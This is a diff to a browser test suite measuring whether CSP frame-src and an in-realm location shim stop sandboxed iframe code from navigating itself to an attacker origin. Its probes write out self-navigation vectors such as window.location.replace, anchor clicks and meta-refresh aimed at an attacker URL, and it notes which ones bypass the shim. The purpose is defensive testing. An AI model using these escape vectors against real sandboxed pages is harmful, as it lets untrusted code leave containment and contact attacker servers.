@@ -21,6 +21,27 @@ import {
  * self-navigation, CSP `default-src` governs fetches rather than
  * navigation, and `navigate-to` was dropped from CSP3.
  *
+ * There are now TWO independent things in play, and this file keeps them
+ * apart on purpose:
+ *
+ *   1. the HOST-PAGE `frame-src` allowlist — a real boundary, enforced by
+ *      the engine outside the sandbox's realm (D43);
+ *   2. the IN-REALM shim the host injects around the bundle
+ *      (`wrapBundleSource` in sandboxDocument.ts) — bar-raising only. It
+ *      shadows the bare `location` identifier inside the bundle's own
+ *      scope, because the real `Location` members are
+ *      `[LegacyUnforgeable]` and cannot be patched at all.
+ *
+ * Conflating them would be the exact failure this file exists to prevent,
+ * so the shimmed vectors (`nav-replace`, `nav-href`) are expected to be
+ * stopped in EVERY configuration — including the no-CSP control, where
+ * nothing else stops anything, and including the allowlist-the-attacker
+ * controls, where the boundary deliberately permits the navigation. That
+ * uniformity is the proof it is the shim and not the policy. The
+ * `nav-window-location` probe reaches the same underlying API one
+ * property access away and is NOT shimmed, so it, `nav-anchor` and
+ * `nav-meta` are what actually measure the host-page policy.
+ *
  * This file measures whether a `frame-src` allowlist on the HOST page
  * closes that hole, on every engine, with server-side ground truth:
  *
@@ -155,9 +176,16 @@ const ARM = `parent.postMessage(JSON.stringify({ type: 'probe-armed' }), '*');`;
 
 /** Self-navigation vectors. Each returns bundle source for one vector. */
 const NAV_PROBES: Record<string, (target: string) => string> = {
+  // the bare identifier — inside the bundle's scope this resolves to the
+  // host's shim, not to the real Location
   'nav-replace': (target) =>
     `${ARM} location.replace(${JSON.stringify(target)});`,
   'nav-href': (target) => `${ARM} location.href = ${JSON.stringify(target)};`,
+  // the same underlying API, reached through an object: the shim shadows
+  // an IDENTIFIER, so this gets the real, unforgeable Location. Its whole
+  // job is to keep the shim from being read as containment.
+  'nav-window-location': (target) =>
+    `${ARM} window.location.replace(${JSON.stringify(target)});`,
   'nav-anchor': (target) => `
     ${ARM}
     var a = document.createElement('a');
@@ -178,6 +206,15 @@ const NAV_PROBES: Record<string, (target: string) => string> = {
 };
 
 const PROBE_NAMES = Object.keys(NAV_PROBES);
+
+/**
+ * Vectors the host's in-realm shim reaches: the bare `location`
+ * identifier inside the bundle's scope. Everything else in NAV_PROBES
+ * either goes through an object reference or never touches a JS accessor
+ * at all, and is therefore untouched by anything the host can do inside
+ * the realm.
+ */
+const IN_REALM_SHIMMED = new Set(['nav-replace', 'nav-href']);
 
 /** A bundle that only proves the srcdoc frame loaded and ran at all (Q2). */
 const ALIVE_BUNDLE = `
@@ -424,8 +461,12 @@ async function observeSrcdocLoad(
  * expectation says so, so that a future engine change that quietly opens
  * or closes a hole fails this suite instead of passing it.
  *
- * All four navigation vectors behave identically within each config, so
- * the expectation is per-config; a future per-vector divergence fails.
+ * `navigation` is what the HOST-PAGE POLICY does, and therefore applies
+ * only to the vectors the in-realm shim does not reach
+ * (`nav-window-location`, `nav-anchor`, `nav-meta`). The shimmed vectors
+ * are asserted separately, at BLOCKED-PREFLIGHT in every configuration —
+ * see `IN_REALM_SHIMMED`. Within each of those two groups all vectors
+ * behave identically, and a future per-vector divergence fails.
  */
 const EXPECTED: Record<
   string,
@@ -437,10 +478,12 @@ const EXPECTED: Record<
   }
 > = {
   // KNOWN GAP, and the positive control for the whole file: with no CSP
-  // on the host page — today's production posture — all four
-  // self-navigation vectors reach the attacker and commit its response.
-  // `sandbox="allow-scripts"` and the child's `default-src 'none'` do not
-  // touch this.
+  // on the host page — today's production posture — self-navigation still
+  // reaches the attacker and commits its response. `sandbox="allow-scripts"`
+  // and the child's `default-src 'none'` do not touch this, and neither
+  // does the in-realm shim: `window.location.replace`, a synthetic anchor
+  // click and a `document.write` meta-refresh all go straight through.
+  // This row is where the residual gap shows.
   'A/no-csp': {
     srcdocLoads: true,
     navigation: 'NOT-BLOCKED',
@@ -494,6 +537,18 @@ const BLOCKED_NAV_KEEPS_SRCDOC_FRAME: Record<string, boolean> = {
   webkit: true,
 };
 
+/**
+ * Engine divergence, measured: how many `load` events an iframe fires
+ * when `srcdoc` is assigned to an element that is ALREADY in the
+ * document. Chromium and webkit fire the initial `about:blank` load as
+ * well; firefox does not.
+ */
+const SRCDOC_AFTER_INSERT_LOADS: Record<string, number> = {
+  chromium: 2,
+  firefox: 1,
+  webkit: 2,
+};
+
 for (const config of HOST_CONFIGS) {
   const expected = EXPECTED[config.id];
 
@@ -506,15 +561,23 @@ for (const config of HOST_CONFIGS) {
     });
 
     for (const probe of PROBE_NAMES) {
+      const shimmed = IN_REALM_SHIMMED.has(probe);
+      // the in-realm shim is not a policy: it stops the same two vectors
+      // whatever the host page says, INCLUDING in the configs that
+      // deliberately allowlist the attacker
+      const expectedClassification = shimmed
+        ? 'BLOCKED-PREFLIGHT'
+        : expected.navigation;
+
       test(`self-navigation: ${probe}`, async ({ page }) => {
         const result = await observeNavProbe(page, config, probe);
 
         // the frame must have actually run the probe, or the cell is
         // meaningless
         expect(result.armed).toBe(true);
-        expect(result.classification).toBe(expected.navigation);
+        expect(result.classification).toBe(expectedClassification);
 
-        if (expected.navigation === 'NOT-BLOCKED') {
+        if (expectedClassification === 'NOT-BLOCKED') {
           // documents the gap concretely: bytes reached the attacker and
           // the frame is now showing the attacker's document
           expect(result.serverHits).toBeGreaterThan(0);
@@ -527,14 +590,115 @@ for (const config of HOST_CONFIGS) {
           expect(result.committed).toBe(false);
           expect(result.netRequests).toEqual([]);
           expect(result.netResponses).toEqual([]);
+          // a shimmed vector never attempted a navigation at all, so the
+          // frame is untouched on every engine; a POLICY-blocked one was
+          // refused by the engine, and chromium commits an error page
+          // into the frame when that happens
           expect(result.frameStillSrcdoc).toBe(
-            BLOCKED_NAV_KEEPS_SRCDOC_FRAME[test.info().project.name]
+            shimmed
+              ? true
+              : BLOCKED_NAV_KEEPS_SRCDOC_FRAME[test.info().project.name]
           );
         }
       });
     }
   });
 }
+
+/**
+ * LOAD-EVENT GROUND TRUTH for the host's teardown (SurfaceSandboxHost).
+ *
+ * The host treats "a second `load` on the same iframe element" as "the
+ * frame navigated itself" and destroys the frame. That rests entirely on
+ * a platform fact, so the fact is measured here rather than assumed —
+ * on every engine, against the host's own document assembly.
+ *
+ * It also records WHY a spec-revision change must be a new element and
+ * never an in-place `srcdoc` reassignment: assigning `srcdoc` to an
+ * element that is already in the document produces an extra
+ * `about:blank` load on chromium and webkit (firefox fires only one),
+ * and that extra load is indistinguishable from the frame navigating
+ * itself, so the host would tear the surface down on a routine edit.
+ */
+const loadCounts: { case: string; loads: number }[] = [];
+
+/** counts `load` events on one sandbox iframe */
+async function countFrameLoads(
+  page: import('@playwright/test').Page,
+  bundleSource: string,
+  options: { srcdocAfterInsert?: boolean; settleMs: number }
+): Promise<number> {
+  const doc = buildSandboxDocument({ shellJs, shellCss, bundleSource });
+  // Config A (no host CSP), so a navigation is not refused before it can
+  // produce its load event
+  await page.goto(hostUrlFor(HOST_CONFIGS[0]));
+  await page.evaluate(
+    ({ doc, flags, afterInsert }) => {
+      const w = window as unknown as { __loads: number };
+      w.__loads = 0;
+      const iframe = document.createElement('iframe');
+      iframe.setAttribute('sandbox', flags);
+      iframe.addEventListener('load', () => {
+        w.__loads += 1;
+      });
+      if (afterInsert) {
+        document.body.appendChild(iframe);
+        iframe.setAttribute('srcdoc', doc);
+      } else {
+        // srcdoc BEFORE insertion — what React does for a freshly
+        // mounted element, and what the host's teardown relies on
+        iframe.setAttribute('srcdoc', doc);
+        document.body.appendChild(iframe);
+      }
+    },
+    {
+      doc,
+      flags: SURFACE_SANDBOX_IFRAME_FLAGS,
+      afterInsert: options.srcdocAfterInsert === true,
+    }
+  );
+  await page.waitForTimeout(options.settleMs);
+  const loads = await page.evaluate(
+    () => (window as unknown as { __loads: number }).__loads
+  );
+  return loads;
+}
+
+test.describe('iframe load events (host teardown premise)', () => {
+  test('a quiet srcdoc frame fires exactly one load', async ({ page }) => {
+    const loads = await countFrameLoads(page, ALIVE_BUNDLE, { settleMs: 1200 });
+    loadCounts.push({ case: 'quiet srcdoc (set before insert)', loads });
+    expect(loads).toBe(1);
+  });
+
+  test('a self-navigating frame fires a second load', async ({ page }) => {
+    // deliberately the UNSHIMMED vector, and delayed, so the initial
+    // load has certainly completed before the navigation starts
+    const loads = await countFrameLoads(
+      page,
+      `setTimeout(function () {
+         window.location.replace(${JSON.stringify(`${attackerOrigin}/load-probe`)});
+       }, 250);`,
+      { settleMs: 2500 }
+    );
+    loadCounts.push({ case: 'self-navigating srcdoc', loads });
+    expect(loads).toBe(2);
+  });
+
+  test('assigning srcdoc after insertion is engine-divergent', async ({
+    page,
+  }) => {
+    const loads = await countFrameLoads(page, ALIVE_BUNDLE, {
+      srcdocAfterInsert: true,
+      settleMs: 1200,
+    });
+    loadCounts.push({ case: 'srcdoc set AFTER insert', loads });
+    // engine-divergent, and the reason in-place srcdoc reassignment is
+    // banned in the host: on chromium/webkit it looks exactly like a
+    // frame navigating itself
+    expect(loads).toBe(SRCDOC_AFTER_INSERT_LOADS[test.info().project.name]);
+  });
+});
 
 test.afterAll(() => {
   const engine = test.info().project.name;
@@ -552,6 +716,8 @@ test.afterAll(() => {
         `committed=${String(o.committed).padEnd(5)} ${o.classification.padEnd(18)} ` +
         `frame=${o.frameUrls[1]}`
     ),
+    `iframe load events (host teardown premise):`,
+    ...loadCounts.map((l) => `  ${l.case.padEnd(36)} loads=${l.loads}`),
   ];
   // the suite doubles as the evidence artifact for the posture review
   // eslint-disable-next-line no-console
